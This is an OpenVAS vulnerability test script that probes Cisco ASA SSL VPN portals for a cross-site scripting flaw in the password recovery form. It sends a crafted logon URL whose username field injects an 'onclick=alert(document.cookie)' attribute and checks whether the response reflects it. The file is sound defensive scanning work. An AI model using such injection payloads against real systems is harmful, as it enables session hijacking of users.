###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cisco_asa_vpn_portal_xss_vuln.nasl 5384 2017-02-21 09:31:06Z teissa $
#
# Cisco ASA Software VPN Portal Cross-Site Scripting (XSS) Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:cisco:asa";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806687");
  script_version("$Revision: 5384 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-02-21 10:31:06 +0100 (Tue, 21 Feb 2017) $");
  script_tag(name:"creation_date", value:"2016-02-22 13:34:22 +0530 (Mon, 22 Feb 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Cisco ASA Software VPN Portal Cross-Site Scripting (XSS) Vulnerability");

  script_tag(name:"summary", value:"This host is running Cisco ASA SSL VPN and
  is prone to cross-site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"The flaw is due to an an error in password
  recovery form which fails to filter properly the hidden inputs.");

  script_tag(name:"impact", value:"Successful exploitation allow the attacker
  to execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.

  Impact Level: Application");

  script_tag(name:"affected", value:"Cisco ASA VPN Portal.");

  script_tag(name:"solution", value :"No solution or patch was made available for at least one year since disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name : "URL" , value : "https://packetstormsecurity.com/files/135813");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2016/Feb/82");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("CISCO");
  script_dependencies("gb_cisco_asa_detect.nasl");
  script_mandatory_keys("cisco_asa/webvpn/installed");
  script_require_ports("Services/www", 443);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
http_port = 0;

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Vulnerable URL
url = "/+CSCOE+/logon.html?reason=2&a0=63&a1=&a2=&a3=0&next=&auth_handle" +
      "=&status=0&username=juansacco%22%20accesskey%3dX%20onclick%3daler" +
      "t(document.cookie)%20sacco&password_min=0&state=&tgroup=&serverType=0&password_";

req = http_get(item:url, port:http_port);
buf = http_keepalive_send_recv(port:http_port, data:req, bodyonly:FALSE);

##Confirm exploit worked
if(buf =~ "HTTP/1\.. 200" && "onclick=alert(document.cookie)" >< buf && ">New Password<" >< buf
   && ">SSL VPN Service<" >< buf)
{
  report = report_vuln_url(port:http_port, url:url);
  security_message(port:http_port, data:report);
  exit(0);
}
